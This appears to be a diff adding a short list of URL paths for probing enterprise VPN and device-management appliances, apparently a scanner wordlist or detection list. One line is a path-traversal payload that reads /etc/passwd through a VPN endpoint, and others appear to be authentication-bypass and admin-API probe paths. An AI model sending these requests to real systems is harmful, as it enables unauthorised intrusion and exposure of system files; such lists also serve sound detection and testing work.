@@ -1,0 +1,8 @@
+
+/dana-na/auth/url_default/welcome.cgi
+/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
+/mifs/aad/api/v2/admins/users
+/mifs/asfV3/api/v2/admins/users
+/client/index.php%3F.php/gsb/users.php
+/dana-na/auth/url_6/welcome.cgi
+/dana/home/index.cgi
